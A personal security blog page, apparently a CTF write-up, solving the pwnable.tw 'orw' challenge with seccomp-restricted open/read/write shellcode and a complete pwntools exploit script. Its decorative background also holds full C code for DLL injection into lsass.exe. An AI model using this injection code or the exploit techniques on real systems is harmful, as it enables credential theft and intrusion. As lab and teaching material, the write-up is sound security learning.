@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ORW</title>
+    <meta name="description" content="A digital garden for System Exploitation & Reverse Engineering.">
+    
+    <!-- Open Graph Metadata -->
+    <meta property="og:title" content="ORW" />
+    <meta property="og:description" content="System Exploitation and Reverse Engineering Portfolio" />
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="http://localhost:4000/assets/img/re_background.png" />
+    
+    <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body>
+    <!-- Authentic Code Background Layer (Windows Exploit Context) -->
+    <div id="bg-code-layer" aria-hidden="true">
+#include &lt;windows.h&gt;
+#include &lt;iostream&gt;
+#include &lt;tlhelp32.h&gt;
+
+// Internal structures for PEB and API Hooking
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
+DWORD FindProcessId(const std::wstring& processName) {
+    PROCESSENTRY32 processInfo;
+    processInfo.dwSize = sizeof(processInfo);
+
+    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+    if (processesSnapshot == INVALID_HANDLE_VALUE) return 0;
+
+    Process32First(processesSnapshot, &processInfo);
+    if (!processName.compare(processInfo.szExeFile)) {
+        CloseHandle(processesSnapshot);
+        return processInfo.th32ProcessID;
+    }
+
+    while (Process32Next(processesSnapshot, &processInfo)) {
+        if (!processName.compare(processInfo.szExeFile)) {
+            CloseHandle(processesSnapshot);
+            return processInfo.th32ProcessID;
+        }
+    }
+
+    CloseHandle(processesSnapshot);
+    return 0;
+}
+
+int main() {
+    LPCSTR dllPath = "C:\\Payloads\\KAAAMMUUI_Hook.dll";
+    DWORD processId = FindProcessId(L"lsass.exe");
+
+    if (!processId) {
+        std::cerr << "[-] Target process not found." << std::endl;
+        return 1;
+    }
+
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
+    if (!hProcess) {
+        std::cerr << "[-] Failed to open process." << std::endl;
+        return 1;
+    }
+
+    LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
+    WriteProcessMemory(hProcess, pDllPath, (LPVOID)dllPath, strlen(dllPath) + 1, 0);
+
+    HANDLE hLoadThread = CreateRemoteThread(hProcess, 0, 0,
+        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"),
+        pDllPath, 0, 0);
+
+    WaitForSingleObject(hLoadThread, INFINITE);
+    VirtualFreeEx(hProcess, pDllPath, strlen(dllPath) + 1, MEM_RELEASE);
+    CloseHandle(hLoadThread);
+    CloseHandle(hProcess);
+
+    std::cout << "[+] Payload successfully injected into memory space." << std::endl;
+    return 0;
+}
+    </div>
+
+    <div class="glow-orb-1"></div>
+    <div class="glow-orb-2"></div>
+
+    <header>
+        <div class="container">
+            <a href="/" class="site-title">KAAAMMUUI</a>
+            <nav>
+                <a href="/" >Home</a>
+                <a href="/projects/" >Projects</a>
+                <a href="/game-modding/" >Game Modding</a>
+                <a href="/writeups/" class="active">CTF Writeups</a>
+                <a href="/notes/" >Notes</a>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <div class="container page-layout">
+    <article class="post">
+        <header class="post-header">
+            <h1>ORW</h1>
+            
+            <p class="post-meta">Published: May 10, 2026</p>
+            
+            
+            <p style="color: var(--text-muted); margin-top: 5px; font-size: 0.9rem;">Tags: </p>
+            
+        </header>
+
+        <div class="post-content" id="post-content">
+            <p><strong>Flag:</strong> <code class="language-plaintext highlighter-rouge">FLAG{sh3llc0ding_w1th_op3n_r34d_writ3}</code></p>
+
+<h2 id="binary-analysis">Binary Analysis</h2>
+
+<p>We start by analyzing the basic properties of the binary using <code class="language-plaintext highlighter-rouge">file</code> and <code class="language-plaintext highlighter-rouge">checksec</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>file orw
+orw: ELF 32-bit LSB executable, Intel i386, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib/ld-linux.so.2, <span class="k">for </span>GNU/Linux 2.6.32, not stripped
+
+<span class="nv">$ </span>checksec orw
+    Arch:       i386-32-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX unknown - GNU_STACK missing
+    PIE:        No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
+    Stack:      Executable
+    RWX:        Has RWX segments
+    Stripped:   No
+</code></pre></div></div>
+
+<p>The binary is a 32-bit executable without PIE. It does have a stack canary, but importantly, the stack is marked as executable (<code class="language-plaintext highlighter-rouge">Has RWX segments</code>), suggesting we’ll be dealing with shellcode execution rather than ROP.</p>
+
+<p>When we run the binary, it prompts us for shellcode and then simply executes it (or segfaults if we provide junk):</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>./orw
+Give my your shellcode: AAAA
+zsh: segmentation fault  ./orw
+</code></pre></div></div>
+
+<h2 id="static-analysis--seccomp">Static Analysis &amp; Seccomp</h2>
+
+<p>By looking into the decompilation of the program, we can see the <code class="language-plaintext highlighter-rouge">main</code> function:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">orw_seccomp</span><span class="p">();</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Give my your shellcode:"</span><span class="p">);</span>
+  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="mi">200</span><span class="p">);</span>
+  <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">code</span> <span class="o">*</span><span class="p">)</span><span class="n">shellcode</span><span class="p">)();</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>The program clearly reads up to 200 bytes of our shellcode into a buffer and then jumps to it. However, the first thing <code class="language-plaintext highlighter-rouge">main</code> does is call <code class="language-plaintext highlighter-rouge">orw_seccomp()</code>.</p>
+
+<h3 id="the-orw_seccomp-function">The <code class="language-plaintext highlighter-rouge">orw_seccomp</code> Function</h3>
+
+<p>This function is responsible for installing a <strong>seccomp</strong> (secure computing mode) sandbox. Seccomp uses BPF (Berkeley Packet Filter) rules to determine which system calls the process is allowed to execute.</p>
+
+<p>If we look at the raw BPF instructions being set up in <code class="language-plaintext highlighter-rouge">orw_seccomp()</code>, or by using a tool like <code class="language-plaintext highlighter-rouge">seccomp-tools</code>, we can see the exact restrictions:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>seccomp-tools dump ./orw
+</code></pre></div></div>
+
+<p>The filter translates to the following logic:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="n">arch</span> <span class="o">!=</span> <span class="n">AUDIT_ARCH_I386</span><span class="p">)</span>
+    <span class="n">KILL</span><span class="p">;</span>
+
+<span class="k">switch</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">case</span> <span class="n">read</span><span class="p">:</span>          <span class="c1">// 3</span>
+    <span class="k">case</span> <span class="n">write</span><span class="p">:</span>         <span class="c1">// 4</span>
+    <span class="k">case</span> <span class="n">open</span><span class="p">:</span>          <span class="c1">// 5</span>
+    <span class="k">case</span> <span class="n">exit</span><span class="p">:</span>          <span class="c1">// 1</span>
+    <span class="k">case</span> <span class="n">exit_group</span><span class="p">:</span>    <span class="c1">// 252</span>
+    <span class="k">case</span> <span class="n">sigreturn</span><span class="p">:</span>     <span class="c1">// 119</span>
+    <span class="k">case</span> <span class="n">rt_sigreturn</span><span class="p">:</span>  <span class="c1">// 173</span>
+        <span class="n">ALLOW</span><span class="p">;</span>
+
+    <span class="nl">default:</span>
+        <span class="n">KILL</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>This explains the challenge’s name: <strong>O</strong>pen <strong>R</strong>ead <strong>W</strong>rite. Our standard shellcode uses the <code class="language-plaintext highlighter-rouge">execve</code> syscall (number 11) to spawn <code class="language-plaintext highlighter-rouge">/bin/sh</code>. Since <code class="language-plaintext highlighter-rouge">execve</code> is not in the allowed list, standard shellcode will cause the kernel to immediately kill our process with <code class="language-plaintext highlighter-rouge">SIGSYS</code> (bad system call).</p>
+
+<h2 id="exploitation-strategy">Exploitation Strategy</h2>
+
+<p>Since we cannot get an interactive shell, we must write a custom shellcode that reads the flag directly and prints it back to us. The goal is to:</p>
+<ol>
+  <li><code class="language-plaintext highlighter-rouge">open("/home/orw/flag", O_RDONLY)</code></li>
+  <li><code class="language-plaintext highlighter-rouge">read(fd, buffer, size)</code></li>
+  <li><code class="language-plaintext highlighter-rouge">write(1, buffer, size)</code></li>
+</ol>
+
+<h3 id="crafting-the-orw-shellcode">Crafting the ORW Shellcode</h3>
+
+<p>We can write this in 32-bit x86 assembly.</p>
+
+<p><strong>Step 1: Open</strong>
+We need to push the string <code class="language-plaintext highlighter-rouge">"/home/orw/flag"</code> onto the stack, null-terminated. Since it’s a 14-byte string, we need to pad it or structure it to fit nicely into 4-byte pushes.</p>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">/*</span> <span class="nf">open</span><span class="p">(</span><span class="s">"/home/orw/flag"</span><span class="p">,</span> <span class="nv">O_RDONLY</span><span class="p">)</span> <span class="o">*/</span>
+<span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
+<span class="nf">push</span> <span class="nb">eax</span>                <span class="o">/*</span> <span class="nv">null</span> <span class="nv">terminator</span> <span class="o">*/</span>
+<span class="nf">push</span> <span class="mh">0x67616c66</span>         <span class="o">/*</span> <span class="s">"flag"</span> <span class="p">(</span><span class="nv">reversed</span><span class="p">)</span> <span class="o">*/</span>
+<span class="nf">push</span> <span class="mh">0x2f77726f</span>         <span class="o">/*</span> <span class="s">"orw/"</span> <span class="p">(</span><span class="nv">reversed</span><span class="p">)</span> <span class="o">*/</span>
+<span class="nf">push</span> <span class="mh">0x2f656d6f</span>         <span class="o">/*</span> <span class="s">"ome/"</span> <span class="p">(</span><span class="nv">reversed</span><span class="p">)</span> <span class="o">*/</span>
+<span class="nf">push</span> <span class="mh">0x682f2f2f</span>         <span class="o">/*</span> <span class="s">"///h"</span> <span class="p">(</span><span class="nv">reversed</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="s">"/home/orw/flag"</span> <span class="o">*/</span>
+<span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>            <span class="o">/*</span> <span class="nb">ebx</span> <span class="err">=</span> <span class="nv">pointer</span> <span class="nv">to</span> <span class="nv">path</span> <span class="nv">string</span> <span class="o">*/</span>
+<span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>            <span class="o">/*</span> <span class="nv">O_RDONLY</span> <span class="nv">flag</span> <span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*/</span>
+<span class="nf">xor</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">edx</span>            <span class="o">/*</span> <span class="nv">mode</span> <span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*/</span>
+<span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mi">5</span>               <span class="o">/*</span> <span class="nv">syscall</span> <span class="mi">5</span> <span class="nv">is</span> <span class="nv">open</span> <span class="o">*/</span>
+<span class="nf">int</span> <span class="mh">0x80</span>
+</code></pre></div></div>
+<p><em>Note: We used <code class="language-plaintext highlighter-rouge">///h</code> to ensure the string aligns to 4-byte blocks. Multiple slashes in a path are treated as a single slash by the kernel.</em></p>
+
+<p><strong>Step 2: Read</strong>
+The <code class="language-plaintext highlighter-rouge">open</code> syscall returns the file descriptor in <code class="language-plaintext highlighter-rouge">eax</code>. We’ll pass that to <code class="language-plaintext highlighter-rouge">read</code>.</p>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">/*</span> <span class="nf">read</span><span class="p">(</span><span class="nv">fd</span><span class="p">,</span> <span class="nv">buf</span><span class="p">,</span> <span class="mi">64</span><span class="p">)</span> <span class="o">*/</span>
+<span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">eax</span>            <span class="o">/*</span> <span class="nv">Move</span> <span class="nv">fd</span> <span class="nv">from</span> <span class="nb">eax</span> <span class="nv">to</span> <span class="nb">ebx</span> <span class="o">*/</span>
+<span class="nf">sub</span> <span class="nb">esp</span><span class="p">,</span> <span class="mh">0x40</span>           <span class="o">/*</span> <span class="nb">Al</span><span class="nv">locate</span> <span class="mi">64</span> <span class="kt">byte</span><span class="nv">s</span> <span class="nv">on</span> <span class="nv">the</span> <span class="nv">stack</span> <span class="nv">for</span> <span class="nv">the</span> <span class="nv">buffer</span> <span class="o">*/</span>
+<span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>            <span class="o">/*</span> <span class="nb">ecx</span> <span class="nv">points</span> <span class="nv">to</span> <span class="nv">our</span> <span class="nv">new</span> <span class="nv">buffer</span> <span class="o">*/</span>
+<span class="nf">mov</span> <span class="nb">dl</span><span class="p">,</span> <span class="mh">0x40</span>            <span class="o">/*</span> <span class="nv">Read</span> <span class="mi">64</span> <span class="kt">byte</span><span class="nv">s</span> <span class="o">*/</span>
+<span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>            
+<span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mi">3</span>               <span class="o">/*</span> <span class="nv">syscall</span> <span class="mi">3</span> <span class="nv">is</span> <span class="nv">read</span> <span class="o">*/</span>
+<span class="nf">int</span> <span class="mh">0x80</span>
+</code></pre></div></div>
+
+<p><strong>Step 3: Write</strong>
+The <code class="language-plaintext highlighter-rouge">read</code> syscall returns the number of bytes read in <code class="language-plaintext highlighter-rouge">eax</code>. We’ll use this length to write to stdout (fd 1).</p>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">/*</span> <span class="nf">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nv">buf</span><span class="p">,</span> <span class="kt">byte</span><span class="nv">s_read</span><span class="p">)</span> <span class="o">*/</span>
+<span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">eax</span>            <span class="o">/*</span> <span class="nb">Si</span><span class="nv">ze</span> <span class="nv">to</span> <span class="nv">write</span> <span class="o">*/</span>
+<span class="nf">mov</span> <span class="nb">bl</span><span class="p">,</span> <span class="mi">1</span>               <span class="o">/*</span> <span class="nv">fd</span> <span class="mi">1</span> <span class="nv">is</span> <span class="nv">stdout</span> <span class="o">*/</span>
+<span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>            <span class="o">/*</span> <span class="nv">Pointer</span> <span class="nv">to</span> <span class="nv">buffer</span> <span class="nv">is</span> <span class="nv">still</span> <span class="nv">in</span> <span class="nb">esp</span> <span class="o">*/</span>
+<span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mi">4</span>               <span class="o">/*</span> <span class="nv">syscall</span> <span class="mi">4</span> <span class="nv">is</span> <span class="nv">write</span> <span class="o">*/</span>
+<span class="nf">int</span> <span class="mh">0x80</span>
+</code></pre></div></div>
+
+<h2 id="final-exploit-script">Final Exploit Script</h2>
+
+<p>We can construct this assembly easily using <code class="language-plaintext highlighter-rouge">pwntools</code>’ <code class="language-plaintext highlighter-rouge">asm</code> feature.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="sh">'</span><span class="s">i386</span><span class="sh">'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="sh">'</span><span class="s">linux</span><span class="sh">'</span>
+
+<span class="c1"># Connect to remote server
+</span><span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">'</span><span class="s">chall.pwnable.tw</span><span class="sh">'</span><span class="p">,</span> <span class="mi">10001</span><span class="p">)</span>
+
+<span class="c1"># Craft the assembly
+</span><span class="n">shellcode</span> <span class="o">=</span> <span class="nf">asm</span><span class="p">(</span><span class="sh">"""</span><span class="s">
+    /* open(</span><span class="sh">"</span><span class="s">/home/orw/flag</span><span class="sh">"</span><span class="s">, O_RDONLY) */
+    xor eax, eax
+    push eax
+    push 0x67616c66
+    push 0x2f77726f
+    push 0x2f656d6f
+    push 0x682f2f2f
+    mov ebx, esp
+    xor ecx, ecx
+    xor edx, edx
+    mov al, 5
+    int 0x80
+
+    /* read(fd, buf, 64) */
+    mov ebx, eax
+    sub esp, 0x40
+    mov ecx, esp
+    mov dl, 0x40
+    xor eax, eax
+    mov al, 3
+    int 0x80
+
+    /* write(1, buf, bytes_read) */
+    mov edx, eax
+    mov bl, 1
+    mov ecx, esp
+    mov al, 4
+    int 0x80
+</span><span class="sh">"""</span><span class="p">)</span>
+
+<span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">Give my your shellcode:</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
+
+<span class="c1"># Receive the flag
+</span><span class="nf">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recvall</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">).</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>Running the script connects to the remote server, sends our carefully crafted seccomp-bypassing shellcode, reads the file, and prints out our flag!</p>
+
+        </div>
+    </article>
+    
+    <aside class="toc-container">
+        <div class="toc-sidebar" id="toc-sidebar">
+            <h3>On this page</h3>
+            <ul id="toc-list"></ul>
+        </div>
+    </aside>
+</div>
+
+    </main>
+
+    <footer>
+        <div class="container">
+            <div class="footer-socials" style="margin-bottom: 1rem; display: flex; justify-content: center; gap: 1.5rem;">
+                <a href="https://github.com/HimanshuP601" target="_blank">GitHub</a>
+                <a href="https://www.linkedin.com/in/himanshuparate/" target="_blank">LinkedIn</a>
+                <a href="https://medium.com/@HimanshuP601" target="_blank">Medium</a>
+                <a href="https://pwn.college/hacker/HimanshuP601" target="_blank">pwn.college</a>
+                <a href="mailto:himanshuparate601@gmail.com">Email</a>
+                <span style="color: var(--text-muted);">Discord: himasnhu</span>
+            </div>
+            
+            <div style="margin-bottom: 2rem; display: flex; justify-content: center;">
+                <a href="https://app.hackthebox.com/users/2410266" target="_blank">
+                    <img src="https://www.hackthebox.eu/badge/image/2410266" alt="Hack The Box Badge">
+                </a>
+            </div>
+
+            <p>&copy; 2026 Himanshu Kaaammuui. Hosted natively on GitHub Pages.</p>
+        </div>
+    </footer>
+    <script src="/assets/js/main.js"></script>
+</body>
+</html>
